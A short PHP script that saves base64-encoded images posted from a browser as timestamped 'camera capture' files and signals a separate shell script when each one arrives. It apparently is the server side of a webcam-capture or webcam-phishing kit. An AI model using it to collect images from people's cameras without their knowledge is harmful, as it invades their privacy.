<?php

$date = date('dMYHis');
$imageData = $_POST['cat'] ?? '';

if (empty($imageData)) {
    exit();
}

/* ── Central data directory ── */
$data_dir      = __DIR__ . '/data';
$captures_dir  = $data_dir . '/camera_captures';

if (!is_dir($data_dir)) {
    mkdir($data_dir, 0750, true);
}
if (!is_dir($captures_dir)) {
    mkdir($captures_dir, 0750, true);
}

$filteredData  = substr($imageData, strpos($imageData, ',') + 1);
$unencodedData = base64_decode($filteredData);

$filepath = $captures_dir . '/cam' . $date . '.png';
$fp = fopen($filepath, 'wb');
if ($fp) {
    flock($fp, LOCK_EX);
    fwrite($fp, $unencodedData);
    flock($fp, LOCK_UN);
    fclose($fp);
}

/* ── Signal shell script that a new capture arrived ── */
file_put_contents($data_dir . '/.flag_cam', $filepath);

exit();
?>
